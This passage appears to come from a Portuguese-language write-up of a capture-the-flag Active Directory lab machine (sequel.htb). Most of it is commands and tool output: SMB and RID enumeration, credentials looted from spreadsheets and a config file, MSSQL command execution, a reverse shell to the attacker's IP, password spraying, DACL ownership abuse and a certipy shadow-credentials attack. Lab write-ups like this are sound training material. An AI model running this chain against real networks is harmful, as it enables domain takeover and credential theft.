+SMB         <span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.51</span>     <span class="hljs-number">445</span>    DC01             Accounting Department READ            
+SMB         <span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.51</span>     <span class="hljs-number">445</span>    DC01             ADMIN$                          Remote Admin
+SMB         <span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.51</span>     <span class="hljs-number">445</span>    DC01             C$                              <span class="hljs-meta">Default</span> share
+SMB         <span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.51</span>     <span class="hljs-number">445</span>    DC01             IPC$            READ            Remote IPC
+SMB         <span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.51</span>     <span class="hljs-number">445</span>    DC01             NETLOGON        READ            Logon server share 
+SMB         <span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.51</span>     <span class="hljs-number">445</span>    DC01             SYSVOL          READ            Logon server share 
+SMB         <span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.51</span>     <span class="hljs-number">445</span>    DC01             Users           READ            
+SMB         <span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.51</span>     <span class="hljs-number">445</span>    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-                    
+SMB         <span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.51</span>     <span class="hljs-number">445</span>    DC01             Administrator                 <span class="hljs-number">2024</span>-<span class="hljs-number">06</span>-<span class="hljs-number">08</span> <span class="hljs-number">16</span>:<span class="hljs-number">32</span>:<span class="hljs-number">20</span> <span class="hljs-number">1</span>       Built-<span class="hljs-keyword">in</span> account for administering the computer/domain                                                                                                                          
+SMB         <span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.51</span>     <span class="hljs-number">445</span>    DC01             Guest                         <span class="hljs-number">2024</span>-<span class="hljs-number">12</span>-<span class="hljs-number">25</span> <span class="hljs-number">14</span>:<span class="hljs-number">44</span>:<span class="hljs-number">53</span> <span class="hljs-number">0</span>       Built-<span class="hljs-keyword">in</span> account for guest access to the computer/domain                                                                                                                        
+SMB         <span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.51</span>     <span class="hljs-number">445</span>    DC01             krbtgt                        <span class="hljs-number">2024</span>-<span class="hljs-number">06</span>-<span class="hljs-number">08</span> <span class="hljs-number">16</span>:<span class="hljs-number">40</span>:<span class="hljs-number">23</span> <span class="hljs-number">0</span>       Key Distribution Center Service Account                                                                                                                                         
+SMB         <span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.51</span>     <span class="hljs-number">445</span>    DC01             michael                       <span class="hljs-number">2024</span>-<span class="hljs-number">06</span>-<span class="hljs-number">08</span> <span class="hljs-number">16</span>:<span class="hljs-number">47</span>:<span class="hljs-number">37</span> <span class="hljs-number">0</span>        
+SMB         <span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.51</span>     <span class="hljs-number">445</span>    DC01             ryan                          <span class="hljs-number">2024</span>-<span class="hljs-number">06</span>-<span class="hljs-number">08</span> <span class="hljs-number">16</span>:<span class="hljs-number">55</span>:<span class="hljs-number">45</span> <span class="hljs-number">0</span>        
+SMB         <span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.51</span>     <span class="hljs-number">445</span>    DC01             oscar                         <span class="hljs-number">2024</span>-<span class="hljs-number">06</span>-<span class="hljs-number">08</span> <span class="hljs-number">16</span>:<span class="hljs-number">56</span>:<span class="hljs-number">36</span> <span class="hljs-number">0</span>        
+SMB         <span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.51</span>     <span class="hljs-number">445</span>    DC01             sql_svc                       <span class="hljs-number">2024</span>-<span class="hljs-number">06</span>-<span class="hljs-number">09</span> <span class="hljs-number">07</span>:<span class="hljs-number">58</span>:<span class="hljs-number">42</span> <span class="hljs-number">0</span>        
+SMB         <span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.51</span>     <span class="hljs-number">445</span>    DC01             rose                          <span class="hljs-number">2024</span>-<span class="hljs-number">12</span>-<span class="hljs-number">25</span> <span class="hljs-number">14</span>:<span class="hljs-number">44</span>:<span class="hljs-number">54</span> <span class="hljs-number">0</span>        
+SMB         <span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.51</span>     <span class="hljs-number">445</span>    DC01             ca_svc                        <span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">09</span> <span class="hljs-number">00</span>:<span class="hljs-number">22</span>:<span class="hljs-number">29</span> <span class="hljs-number">0</span>        
+SMB         <span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.51</span>     <span class="hljs-number">445</span>    DC01             [*] Enumerated <span class="hljs-number">9</span> local users: SEQUEL
+SMB         <span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.51</span>     <span class="hljs-number">445</span>    DC01             <span class="hljs-number">498</span>: SEQUEL\Enterprise Read-only Domain Controllers (SidTypeGroup)
+SMB         <span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.51</span>     <span class="hljs-number">445</span>    DC01             <span class="hljs-number">500</span>: SEQUEL\Administrator (SidTypeUser)
+SMB         <span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.51</span>     <span class="hljs-number">445</span>    DC01             <span class="hljs-number">501</span>: SEQUEL\Guest (SidTypeUser)
+SMB         <span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.51</span>     <span class="hljs-number">445</span>    DC01             <span class="hljs-number">502</span>: SEQUEL\krbtgt (SidTypeUser)
+SMB         <span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.51</span>     <span class="hljs-number">445</span>    DC01             <span class="hljs-number">512</span>: SEQUEL\Domain Admins (SidTypeGroup)
+SMB         <span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.51</span>     <span class="hljs-number">445</span>    DC01             <span class="hljs-number">513</span>: SEQUEL\Domain Users (SidTypeGroup)
+SMB         <span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.51</span>     <span class="hljs-number">445</span>    DC01             <span class="hljs-number">514</span>: SEQUEL\Domain Guests (SidTypeGroup)
+SMB         <span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.51</span>     <span class="hljs-number">445</span>    DC01             <span class="hljs-number">515</span>: SEQUEL\Domain Computers (SidTypeGroup)
+SMB         <span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.51</span>     <span class="hljs-number">445</span>    DC01             <span class="hljs-number">516</span>: SEQUEL\Domain Controllers (SidTypeGroup)
+SMB         <span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.51</span>     <span class="hljs-number">445</span>    DC01             <span class="hljs-number">517</span>: SEQUEL\Cert Publishers (SidTypeAlias)
+SMB         <span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.51</span>     <span class="hljs-number">445</span>    DC01             <span class="hljs-number">518</span>: SEQUEL\Schema Admins (SidTypeGroup)
+SMB         <span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.51</span>     <span class="hljs-number">445</span>    DC01             <span class="hljs-number">519</span>: SEQUEL\Enterprise Admins (SidTypeGroup)
+SMB         <span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.51</span>     <span class="hljs-number">445</span>    DC01             <span class="hljs-number">520</span>: SEQUEL\Group Policy Creator Owners (SidTypeGroup)
+SMB         <span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.51</span>     <span class="hljs-number">445</span>    DC01             <span class="hljs-number">521</span>: SEQUEL\Read-only Domain Controllers (SidTypeGroup)
+SMB         <span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.51</span>     <span class="hljs-number">445</span>    DC01             <span class="hljs-number">522</span>: SEQUEL\Cloneable Domain Controllers (SidTypeGroup)
+SMB         <span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.51</span>     <span class="hljs-number">445</span>    DC01             <span class="hljs-number">525</span>: SEQUEL\Protected Users (SidTypeGroup)
+SMB         <span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.51</span>     <span class="hljs-number">445</span>    DC01             <span class="hljs-number">526</span>: SEQUEL\Key Admins (SidTypeGroup)
+SMB         <span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.51</span>     <span class="hljs-number">445</span>    DC01             <span class="hljs-number">527</span>: SEQUEL\Enterprise Key Admins (SidTypeGroup)
+SMB         <span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.51</span>     <span class="hljs-number">445</span>    DC01             <span class="hljs-number">553</span>: SEQUEL\RAS <span class="hljs-keyword">and</span> IAS Servers (SidTypeAlias)
+SMB         <span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.51</span>     <span class="hljs-number">445</span>    DC01             <span class="hljs-number">571</span>: SEQUEL\Allowed RODC Password Replication Group (SidTypeAlias)
+SMB         <span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.51</span>     <span class="hljs-number">445</span>    DC01             <span class="hljs-number">572</span>: SEQUEL\Denied RODC Password Replication Group (SidTypeAlias)
+SMB         <span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.51</span>     <span class="hljs-number">445</span>    DC01             <span class="hljs-number">1000</span>: SEQUEL\DC01$ (SidTypeUser)
+SMB         <span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.51</span>     <span class="hljs-number">445</span>    DC01             <span class="hljs-number">1101</span>: SEQUEL\DnsAdmins (SidTypeAlias)
+SMB         <span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.51</span>     <span class="hljs-number">445</span>    DC01             <span class="hljs-number">1102</span>: SEQUEL\DnsUpdateProxy (SidTypeGroup)
+SMB         <span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.51</span>     <span class="hljs-number">445</span>    DC01             <span class="hljs-number">1103</span>: SEQUEL\michael (SidTypeUser)
+SMB         <span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.51</span>     <span class="hljs-number">445</span>    DC01             <span class="hljs-number">1114</span>: SEQUEL\ryan (SidTypeUser)
+SMB         <span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.51</span>     <span class="hljs-number">445</span>    DC01             <span class="hljs-number">1116</span>: SEQUEL\oscar (SidTypeUser)
+SMB         <span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.51</span>     <span class="hljs-number">445</span>    DC01             <span class="hljs-number">1122</span>: SEQUEL\sql_svc (SidTypeUser)
+SMB         <span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.51</span>     <span class="hljs-number">445</span>    DC01             <span class="hljs-number">1128</span>: SEQUEL\SQLServer2005SQLBrowserUser$DC01 (SidTypeAlias)
+SMB         <span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.51</span>     <span class="hljs-number">445</span>    DC01             <span class="hljs-number">1129</span>: SEQUEL\SQLRUserGroupSQLEXPRESS (SidTypeAlias)
+SMB         <span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.51</span>     <span class="hljs-number">445</span>    DC01             <span class="hljs-number">1601</span>: SEQUEL\rose (SidTypeUser)
+SMB         <span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.51</span>     <span class="hljs-number">445</span>    DC01             <span class="hljs-number">1602</span>: SEQUEL\Management Department (SidTypeGroup)
+SMB         <span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.51</span>     <span class="hljs-number">445</span>    DC01             <span class="hljs-number">1603</span>: SEQUEL\Sales Department (SidTypeGroup)
+SMB         <span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.51</span>     <span class="hljs-number">445</span>    DC01             <span class="hljs-number">1604</span>: SEQUEL\Accounting Department (SidTypeGroup)
+SMB         <span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.51</span>     <span class="hljs-number">445</span>    DC01             <span class="hljs-number">1605</span>: SEQUEL\Reception Department (SidTypeGroup)
+SMB         <span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.51</span>     <span class="hljs-number">445</span>    DC01             <span class="hljs-number">1606</span>: SEQUEL\Human Resources Department (SidTypeGroup)
+SMB         <span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.51</span>     <span class="hljs-number">445</span>    DC01             <span class="hljs-number">1607</span>: SEQUEL\ca_svc (SidTypeUser)
+</code></pre>
+<p>Conseguimos descobrir outros usuários locais e de rede, 
+além de um compartilhamento smb contendo alguns arquivos. </p>
+<pre><code class="lang-bash">root@kali: <span class="hljs-comment"># proxychains -q impacket-smbclient sequel.htb/rose:'KxEPkKe6R8su'@10.10.11.51                                                                           </span>
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+Type help for list of commands
+<span class="hljs-comment"># shares</span>
+Accounting Department
+ADMIN$
+C$
+IPC$
+NETLOGON
+SYSVOL
+Users
+<span class="hljs-comment"># use Accounting Department</span>
+<span class="hljs-comment"># ls</span>
+drw-rw-rw-         <span class="hljs-number"> 0 </span> Sun Jun <span class="hljs-number"> 9 </span>07:11:31<span class="hljs-number"> 2024 </span>.
+drw-rw-rw-         <span class="hljs-number"> 0 </span> Sun Jun <span class="hljs-number"> 9 </span>07:11:31<span class="hljs-number"> 2024 </span>..
+-rw-rw-rw-     <span class="hljs-number"> 10217 </span> Sun Jun <span class="hljs-number"> 9 </span>07:11:31<span class="hljs-number"> 2024 </span>accounting_2024.xlsx
+-rw-rw-rw-      <span class="hljs-number"> 6780 </span> Sun Jun <span class="hljs-number"> 9 </span>07:11:31<span class="hljs-number"> 2024 </span>accounts.xlsx
+<span class="hljs-comment"># get accounting_2024.xlsx</span>
+<span class="hljs-comment"># get accounts.xlsx</span>
+
+//baixando para nossa maquina podemos ver o conteudo dos arquivos: 
+Angela    Martin          angela@sequel.htb    angela    0fwz7Q4mSpurIt99
+Oscar      Martinez        oscar@sequel.htb    oscar      86LxLBMgEWaKUnBG
+Kevin      Malone          kevin@sequel.htb    kevin      Md9Wlq1E5bZnVDVo 
+-          -              sa@sequel.htb         sa        MSSQLP@ssw0rd!
+</code></pre>
+<p>Conseguimos algumas senhas de usuário, e uma do serviço <code>mssql</code>.
+Agora faremos uma enumeração de domínio para nos ajudar a saber 
+configurações do <code>Domain</code>.</p>
+<pre><code class="lang-bash"><span class="hljs-comment">// via LDAP</span>
+$ ldapdomaindump -u sequel.htb\\rose -<span class="hljs-selector-tag">p</span> <span class="hljs-string">'KxEPkKe6R8su'</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">11.51</span> -o ldap/                                                        
+[*] Connecting to host...
+[*] Binding to host
+[+] Bind OK
+[*] Starting domain dump
+[+] Domain dump finished
+
+<span class="hljs-comment">// via Bloodhound</span>
+bloodhound-python -u rose -<span class="hljs-selector-tag">p</span> KxEPkKe6R8su -ns <span class="hljs-number">10.10</span>.<span class="hljs-number">11.51</span> -d sequel<span class="hljs-selector-class">.htb</span> -c All
+</code></pre>
+<p><img src="../../static/ldap.png" alt="AD_Image_3"></p>
+<p><img src="../../static/domain.png" alt="domain"></p>
+<p>Podemos ver os usuários locais e de rede. 
+A única conta de administrador de domínio cadastrada atualmente.</p>
+<h2 id="testando-credenciais">Testando Credenciais</h2>
+<p>Vamos tentar autenticar com o <a href="https://www.kali.org/tools/netexec/"><code>netexec</code></a> no <strong>mssql</strong></p>
+<pre><code class="lang-bash">root@kali:~$ proxychains -q netexec mssql <span class="hljs-number">10.10.11.51</span> -u sa -p 'MSSQLP@ssw0rd!' --local-auth                                                                  <span class="hljs-string">[16:53:09]</span>
+MSSQL       <span class="hljs-number">10.10.11.51</span>     <span class="hljs-number">1433</span>   DC01             <span class="hljs-string">[*]</span> Windows <span class="hljs-number">10</span> / Server <span class="hljs-number">2019</span> Build <span class="hljs-number">17763</span> (name:DC01) (domain:sequel.htb)
+MSSQL       <span class="hljs-number">10.10.11.51</span>     <span class="hljs-number">1433</span>   DC01             <span class="hljs-string">[+]</span> DC01\sa:MSSQLP@ssw0rd! (Pwn3d!)
+</code></pre>
+<p><strong>Bingo!</strong> 
+Veja que o <code>netexec</code> está marcando o target como <strong><em>Pwn3d</em></strong> isso significa que podemos executar comandos remotos.</p>
+<pre><code class="lang-bash">$ netexec mssql <span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.51</span> -u sa -p <span class="hljs-string">'MSSQLP@ssw0rd!'</span> --local-auth -X <span class="hljs-string">'whoami ;net user'</span>                                            [<span class="hljs-number">16</span>:<span class="hljs-number">56</span>:<span class="hljs-number">10</span>]
+MSSQL       <span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.51</span>     <span class="hljs-number">1433</span>   DC01             [*] Windows <span class="hljs-number">10</span> / Server <span class="hljs-number">2019</span> Build <span class="hljs-number">17763</span> (name:DC01) (domain:sequel.htb)
+MSSQL       <span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.51</span>     <span class="hljs-number">1433</span>   DC01             [+] DC01\sa:MSSQLP@ssw0rd! (Pwn3d!)
+MSSQL       <span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.51</span>     <span class="hljs-number">1433</span>   DC01             [+] Executed command via mssqlexec
+MSSQL       <span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.51</span>     <span class="hljs-number">1433</span>   DC01             sequel\sql_svc
+MSSQL       <span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.51</span>     <span class="hljs-number">1433</span>   DC01             User accounts for \\DC01
+MSSQL       <span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.51</span>     <span class="hljs-number">1433</span>   DC01             -------------------------------------------------------------------------------
+MSSQL       <span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.51</span>     <span class="hljs-number">1433</span>   DC01             Administrator            ca_svc                   Guest
+MSSQL       <span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.51</span>     <span class="hljs-number">1433</span>   DC01             krbtgt                   michael                  oscar
+MSSQL       <span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.51</span>     <span class="hljs-number">1433</span>   DC01             rose                     ryan                     sql_svc
+MSSQL       <span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.51</span>     <span class="hljs-number">1433</span>   DC01             The command completed successfully.
+</code></pre>
+<p>Vamos escalar isso para uma shell usando <a href="https://en.wikipedia.org/wiki/Base64"><code>base64</code></a></p>
+<ul>
+<li>Aqui eu usei o site <a href="https://revshells.com">revshells.com</a> para gerar o payload em base64.</li>
+</ul>
+<p><img src="../../static/revshell.png" alt="rev"></p>
+<pre><code class="lang-powershell"><span class="hljs-code"> $ nc -lnvp 1337                   </span>
+listening on [any] 1337 ...
+connect to [10.10.15.6] from (UNKNOWN) [10.10.11.72] 58522
+PS C:\Windows\system32&gt; whoami /priv
+
+<span class="hljs-section">PRIVILEGES INFORMATION
+----------------------</span>
+
+Privilege Name                Description                    State   
+============================= ============================== ========
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
+SeCreateGlobalPrivilege       Create global objects          Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
+</code></pre>
+<h2 id="escalando-privil-gios">Escalando privilégios</h2>
+<p>Olhando para os arquivos, vemos um arquivo de configuração do servidor. 
+Dentro dele podemos encontrar a senha <code>WqSZAF6CysDQbGb3</code>.</p>
+<pre><code class="lang-powershell">PS C:\SQL2019\ExpressAdv_ENU&gt; type sql-Configuration.INI
+[OPTIONS]
+ACTION=<span class="hljs-string">"Install"</span>
+QUIET=<span class="hljs-string">"True"</span>
+FEATURES=SQL
+INSTANCENAME=<span class="hljs-string">"SQLEXPRESS"</span>
+INSTANCEID=<span class="hljs-string">"SQLEXPRESS"</span>
+RSSVCACCOUNT=<span class="hljs-string">"NT Service\ReportServer$SQLEXPRESS"</span>
+AGTSVCACCOUNT=<span class="hljs-string">"NT AUTHORITY\NETWORK SERVICE"</span>
+AGTSVCSTARTUPTYPE=<span class="hljs-string">"Manual"</span>
+COMMFABRICPORT=<span class="hljs-string">"0"</span>
+COMMFABRICNETWORKLEVEL=<span class="hljs-string">""</span><span class="hljs-number">0</span><span class="hljs-string">"
+COMMFABRICENCRYPTION="</span><span class="hljs-number">0</span><span class="hljs-string">"
+MATRIXCMBRICKCOMMPORT="</span><span class="hljs-number">0</span><span class="hljs-string">"
+SQLSVCSTARTUPTYPE="</span>Automatic<span class="hljs-string">"
+FILESTREAMLEVEL="</span><span class="hljs-number">0</span><span class="hljs-string">"
+ENABLERANU="</span>False<span class="hljs-string">" 
+SQLCOLLATION="</span>SQL_Latin1_General_CP1_CI_AS<span class="hljs-string">"
+SQLSVCACCOUNT="</span>SEQUEL\sql_svc<span class="hljs-string">"
+SQLSVCPASSWORD="</span>WqSZAF6CysDQbGb3<span class="hljs-string">"
+SQLSYSADMINACCOUNTS="</span>SEQUEL\Administrato<span class="hljs-string">r"
+SECURITYMODE="</span>SQL<span class="hljs-string">"
+SAPWD="</span>MSSQLP<span class="hljs-keyword">@ssw0rd</span>!<span class="hljs-string">"
+ADDCURRENTUSERASSQLADMIN="</span>False<span class="hljs-string">"
+TCPENABLED="</span><span class="hljs-number">1</span><span class="hljs-string">"
+NPENABLED="</span><span class="hljs-number">1</span><span class="hljs-string">"
+BROWSERSVCSTARTUPTYPE="</span>Automatic<span class="hljs-string">"
+IAcceptSQLServerLicenseTerms=True</span>
+</code></pre>
+<p>Vamos usar a lista de usuários que pegamos, e <a href="https://www.crowdstrike.com/en-us/cybersecurity-101/cyberattacks/password-spraying/">pulverizar</a> essa senha.</p>
+<pre><code class="lang-bash">root@kali:~<span class="hljs-comment"># kerbrute passwordspray  -d sequel.htb --dc 10.10.11.51 users.txt "WqSZAF6CysDQbGb3"      [17:19:29]</span>
+
+__             __               __     
+<span class="hljs-regexp">/ /</span>_____  _____<span class="hljs-regexp">/ /</span>_  _______  __<span class="hljs-regexp">/ /</span>____ 
+<span class="hljs-regexp">/ /</span><span class="hljs-regexp">/_/</span> _ \<span class="hljs-regexp">/ ___/</span> __ \<span class="hljs-regexp">/ ___/</span> <span class="hljs-regexp">/ /</span> <span class="hljs-regexp">/ __/</span> _ \
+<span class="hljs-regexp">/ ,&lt; /</span>  __<span class="hljs-regexp">/ /</span>  <span class="hljs-regexp">/ /</span>_<span class="hljs-regexp">/ /</span> <span class="hljs-regexp">/  /</span> <span class="hljs-regexp">/_/</span> <span class="hljs-regexp">/ /</span>_<span class="hljs-regexp">/  __/</span>
+<span class="hljs-regexp">/_/</span>|_|\___<span class="hljs-regexp">/_/</span>  <span class="hljs-regexp">/_.___/</span>_<span class="hljs-regexp">/   \__,_/</span>\__<span class="hljs-regexp">/\___/</span>                                        
+
+Version: v1.<span class="hljs-number">0.3</span> (<span class="hljs-number">9</span>dad6e1) - <span class="hljs-number">03</span><span class="hljs-regexp">/10/</span><span class="hljs-number">25</span> - Ronnie Flathers @ropnop
+
+<span class="hljs-number">2025</span><span class="hljs-regexp">/03/</span><span class="hljs-number">10</span> <span class="hljs-number">17</span>:<span class="hljs-number">19</span>:<span class="hljs-number">46</span> &gt;  Using KDC(s):
+<span class="hljs-number">2025</span><span class="hljs-regexp">/03/</span><span class="hljs-number">10</span> <span class="hljs-number">17</span>:<span class="hljs-number">19</span>:<span class="hljs-number">46</span> &gt;   <span class="hljs-number">10.10</span>.<span class="hljs-number">11.51</span>:<span class="hljs-number">88</span>
+
+<span class="hljs-number">2025</span><span class="hljs-regexp">/03/</span><span class="hljs-number">10</span> <span class="hljs-number">17</span>:<span class="hljs-number">19</span>:<span class="hljs-number">47</span> &gt;  [+] VALID LOGIN:  sql_svc@sequel.htb:WqSZAF6CysDQbGb3
+<span class="hljs-number">2025</span><span class="hljs-regexp">/03/</span><span class="hljs-number">10</span> <span class="hljs-number">17</span>:<span class="hljs-number">19</span>:<span class="hljs-number">47</span> &gt;  [+] VALID LOGIN:  ryan@sequel.htb:WqSZAF6CysDQbGb3
+<span class="hljs-number">2025</span><span class="hljs-regexp">/03/</span><span class="hljs-number">10</span> <span class="hljs-number">17</span>:<span class="hljs-number">19</span>:<span class="hljs-number">47</span> &gt;  Done! Tested <span class="hljs-number">6</span> logins (<span class="hljs-number">2</span> successes) <span class="hljs-keyword">in</span> <span class="hljs-number">0.927</span> seconds
+</code></pre>
+<p>ryan faz parte do grupo <code>Management Department</code> dentro do domínio</p>
+<p><img src="../../static/grupos-ryan.png" alt="map"></p>
+<p>Vamos ver as <code>permissões</code> que ele tem: </p>
+<p><img src="../../static/writeowner.png" alt="map" ></p>
+<p>Podemos ver que ele tem o atributo de <code>WriteOwner</code> em um usuário chamado <code>CA_SVC</code>, ou seja, consegue tomar posse do objeto e lançar um ataque de <a href="https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab"><code>Shadow Credentials</code></a>.</p>
+<h2 id="explorando-miscofiguration">Explorando Miscofiguration</h2>
+<p>Basicamente, vamos transferir o atributo de certificado para o usuário ryan, e explorar uma vulnerabilidade do <code>ActiveDirectory</code> conhecida por <a href="https://nvd.nist.gov/vuln/detail/CVE-2022-26923"><code>CVE-2022-26923</code></a> ou <code>Certifried</code> na qual vamos criar um certificado e extrair hashs do <code>Domain Admin</code>.</p>
+<p><img src="../../static/cert.png" alt="map"></p>
+<pre><code class="lang-bash">root<span class="hljs-symbol">@kali</span>:~<span class="hljs-meta"># bloodyAD --host <span class="hljs-string">'10.10.11.51'</span> -d <span class="hljs-string">'sequel.htb'</span> -u <span class="hljs-string">'ryan'</span> -p <span class="hljs-string">'WqSZAF6CysDQbGb3'</span> set owner <span class="hljs-string">'ca_svc'</span> <span class="hljs-string">'ryan'</span></span>
+[+] Old owner S<span class="hljs-number">-1</span><span class="hljs-number">-5</span><span class="hljs-number">-21</span><span class="hljs-number">-548670397</span><span class="hljs-number">-972687484</span><span class="hljs-number">-3496335370</span><span class="hljs-number">-512</span> is now replaced by ryan on ca_svc
+
+root<span class="hljs-symbol">@kali</span>:~<span class="hljs-meta"># dacledit.py -action <span class="hljs-string">'write'</span> -rights <span class="hljs-string">'FullControl'</span> -principal <span class="hljs-string">'ryan'</span> -target <span class="hljs-string">'ca_svc'</span> <span class="hljs-string">'sequel.htb'</span>/<span class="hljs-string">"ryan"</span>:<span class="hljs-string">"WqSZAF6CysDQbGb3"</span></span>
+Impacket v0<span class="hljs-number">.12</span><span class="hljs-number">.0</span> - Copyright Fortra, LLC <span class="hljs-literal">and</span> its affiliated companies
+
+[*] DACL backed up <span class="hljs-keyword">to</span> dacledit<span class="hljs-number">-20250206</span><span class="hljs-number">-112058.</span>bak
+[*] DACL modified successfully!
+
+//Gerar nosso certificado 
+root<span class="hljs-symbol">@kali</span>:~<span class="hljs-meta"># certipy shadow auto -u <span class="hljs-string">'ryan@sequel.htb'</span> -p <span class="hljs-string">"WqSZAF6CysDQbGb3"</span> -account <span class="hljs-string">'ca_svc'</span> -dc-ip <span class="hljs-string">'10.10.11.51'</span> -target dc01.sequel.htb -ns 10.10.11.51</span>
+Certipy v4<span class="hljs-number">.8</span><span class="hljs-number">.2</span> - by Oliver Lyak (ly4k)
+
+[*] Targeting user <span class="hljs-string">'ca_svc'</span>
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating Key Credential
+[*] Key Credential generated <span class="hljs-keyword">with</span> DeviceID <span class="hljs-string">'81b327f2-913f-8ed0-8f02-0d7683e4d812'</span>
+[*] Adding Key Credential <span class="hljs-keyword">with</span> device ID <span class="hljs-string">'81b327f2-913f-8ed0-8f02-0d7683e4d812'</span> <span class="hljs-keyword">to</span> the Key Credentials <span class="hljs-keyword">for</span> <span class="hljs-string">'ca_svc'</span>
+[*] Successfully added Key Credential <span class="hljs-keyword">with</span> device ID <span class="hljs-string">'81b327f2-913f-8ed0-8f02-0d7683e4d812'</span> <span class="hljs-keyword">to</span> the Key Credentials <span class="hljs-keyword">for</span> <span class="hljs-string">'ca_svc'</span>
+[*] Authenticating as <span class="hljs-string">'ca_svc'</span> <span class="hljs-keyword">with</span> the certificate
+[*] Using principal: ca_svc<span class="hljs-symbol">@sequel</span>.htb
+[*] Trying <span class="hljs-keyword">to</span> get TGT...
+[*] Got TGT
+[*] Saved credential cache <span class="hljs-keyword">to</span> <span class="hljs-string">'ca_svc.ccache'</span>
+[*] Trying <span class="hljs-keyword">to</span> retrieve NT hash <span class="hljs-keyword">for</span> <span class="hljs-string">'ca_svc'</span>
+[*] Restoring the old Key Credentials <span class="hljs-keyword">for</span> <span class="hljs-string">'ca_svc'</span>
+[*] Successfully restored the old Key Credentials <span class="hljs-keyword">for</span> <span class="hljs-string">'ca_svc'</span>
